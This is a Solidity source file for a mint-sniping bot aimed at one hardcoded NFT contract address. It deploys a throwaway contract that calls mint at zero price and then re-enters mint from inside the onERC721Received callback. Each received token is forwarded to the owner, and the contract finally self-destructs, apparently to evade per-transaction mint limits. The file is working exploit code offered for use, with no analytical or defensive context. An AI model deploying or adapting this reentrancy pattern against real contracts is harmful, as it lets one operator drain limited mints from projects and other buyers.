// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import "Ownable.sol";
import "IERC721.sol";
import "IERC721Receiver.sol";

contract CRT is Ownable, IERC721Receiver {

    function execute(  
        uint256 blockNumber
    ) external payable onlyOwner {
        require(blockNumber >= block.number, "CRT_BLOCK_TARGET_EXCEEDED");

        CRTMC instance = new CRTMC(owner());
        instance.execute{value: msg.value}();
    }

    function withdrawBalance(address to) external onlyOwner {
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "CRT_BALANCE_TRANSFER_FAILURE");
    }

    function withdrawERC721(
        IERC721 token,
        address receiver,
        uint256 tokenId
    ) external onlyOwner {
        token.transferFrom(address(this), receiver, tokenId);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract CRTMC is Ownable, IERC721Receiver {
    address private receiver;

    uint256 private constant PRICE = 0 ether;
    IMC private constant TARGET =
        IMC(0x35301F1ecc1C9AcC1118874C5404F5fAdc5536AC);

    constructor(address _receiver) {
        receiver = _receiver;
    }

    function execute() external payable onlyOwner {
        require(msg.value != 0, "CRTMC_INVALID_PRICE");
        TARGET.mint{value: PRICE}(5);
        selfdestruct(payable(receiver));
    }

    function onERC721Received(
        address operator,
        address,
        uint256 tokenId,
        bytes memory
    ) public virtual override returns (bytes4) {
        if (address(TARGET) == msg.sender) {
            IERC721 sender = IERC721(msg.sender);
            sender.transferFrom(operator, receiver, tokenId);

            if (address(this).balance > 0) {
                TARGET.mint{value: PRICE}(5);
            }
        }

        return this.onERC721Received.selector;
    }
}

interface IMC {
    function mint(uint256) external payable;
}